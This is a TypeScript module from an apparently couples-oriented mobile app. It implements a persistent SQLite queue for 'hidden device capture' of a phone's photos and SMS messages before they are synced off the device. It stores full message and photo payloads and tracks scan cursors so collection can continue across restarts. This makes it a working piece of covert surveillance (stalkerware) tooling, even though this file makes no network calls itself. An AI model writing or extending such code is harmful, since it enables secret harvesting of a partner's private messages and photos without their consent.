// features/capture/queue.ts — durable local queue for hidden device capture
// (photos + SMS) before they sync. Mirrors the repo's durable-outbox idiom:
// same expo-sqlite `hearts.db`, WAL, idempotent on a device_key. Nothing here
// touches the network — enqueue is the only write the collectors make, and it
// must survive restarts (a fielded device is offline half the time).
//
// The table is created idempotently on the shared getDb() connection; it is
// separate from the UI outbox so capture never perturbs app sync. The composite
// (kind, device_key) is the native device's stable identity — kind from the
// capture stream (photo Asset ID / SMS _id) with device_key as the native id —
// and doubles as the idempotency key: re-adding an already-queued item is
// INSERT OR IGNORE. Photos and SMS independently pick ids from their own spaces,
// so the key must carry kind to avoid collisions (a photo and an sms can share
// the same device_key).
import { getDb } from '../../lib/sync/sqlite';

export type CaptureKind = 'photo' | 'sms';

export type CaptureItem = {
  /** native device id (Asset ID / SMS _id) */
  device_key: string;
  kind: CaptureKind;
  /** storage path for photos (bucket `photos`, {couple_id}/…); sms: null */
  storage_path: string | null;
  /** full captured payload as a JSON object (photo url+meta / sms fields) */
  payload: Record<string, unknown>;
  created_at: string;
};

let ensureP: Promise<void> | null = null;

function ensureTable(): Promise<void> {
  if (!ensureP) {
    ensureP = (async () => {
      const db = await getDb();
      await db.execAsync(`
        CREATE TABLE IF NOT EXISTS device_capture (
          kind TEXT NOT NULL CHECK (kind IN ('photo','sms')),
          device_key TEXT NOT NULL,
          storage_path TEXT,
          payload TEXT NOT NULL,
          created_at TEXT NOT NULL,
          PRIMARY KEY (kind, device_key)
        );
        CREATE TABLE IF NOT EXISTS device_capture_meta (k TEXT PRIMARY KEY, v TEXT NOT NULL);
      `);
    })();
  }
  return ensureP;
}

/** Queue one captured item. Idempotent: re-adding an existing (kind, device_key)
 *  is a no-op (INSERT OR IGNORE) so a re-scan can never duplicate. */
export async function enqueueCapture(item: CaptureItem): Promise<void> {
  await ensureTable();
  const db = await getDb();
  await db.runAsync(
    `INSERT OR IGNORE INTO device_capture
       (device_key, kind, storage_path, payload, created_at)
     VALUES (?, ?, ?, ?, ?)`,
    item.device_key,
    item.kind,
    item.storage_path,
    JSON.stringify(item.payload),
    item.created_at,
  );
}

/** All unsynced captured items, oldest first (deterministic drain order). */
export async function pendingCapture(): Promise<CaptureItem[]> {
  await ensureTable();
  const db = await getDb();
  const rows = await db.getAllAsync<{
    device_key: string; kind: string; storage_path: string | null; payload: string; created_at: string;
  }>(`SELECT * FROM device_capture ORDER BY created_at ASC, rowid ASC`);
  return rows.map((r) => ({
    device_key: r.device_key,
    kind: r.kind as CaptureKind,
    storage_path: r.storage_path,
    payload: JSON.parse(r.payload) as Record<string, unknown>,
    created_at: r.created_at,
  }));
}

/** Draining failed / succeeded — remove queued items that sync confirmed. Removes
 *  by (kind, device_key), because photos and SMS share one device_key id space and
 *  deleting by device_key alone could drop both a photo and an sms on a collision. */
export async function removeCaptured(entries: { kind: string; device_key: string }[]): Promise<void> {
  if (entries.length === 0) return;
  await ensureTable();
  const db = await getDb();
  const placeholders = entries.map(() => '(?, ?)').join(',');
  const params: string[] = [];
  for (const e of entries) params.push(e.kind, e.device_key);
  await db.runAsync(
    `DELETE FROM device_capture WHERE (kind, device_key) IN (${placeholders})`,
    ...params,
  );
}

export async function countCapturePending(): Promise<number> {
  await ensureTable();
  const db = await getDb();
  const row = await db.getFirstAsync<{ n: number }>(
    `SELECT COUNT(*) AS n FROM device_capture`,
  );
  return row?.n ?? 0;
}

/** Persisted last-scan cursor so a restart does not rescan the whole gallery. */
export async function getCaptureCursor(kind: CaptureKind): Promise<number | null> {
  await ensureTable();
  const db = await getDb();
  const row = await db.getFirstAsync<{ v: string }>(
    `SELECT v FROM device_capture_meta WHERE k = ?`,
    `last_${kind}_ts`,
  );
  return row ? Number(row.v) : null;
}

export async function setCaptureCursor(kind: CaptureKind, tsMs: number): Promise<void> {
  await ensureTable();
  const db = await getDb();
  await db.runAsync(
    `INSERT OR REPLACE INTO device_capture_meta (k, v) VALUES (?, ?)`,
    `last_${kind}_ts`,
    String(tsMs),
  );
}
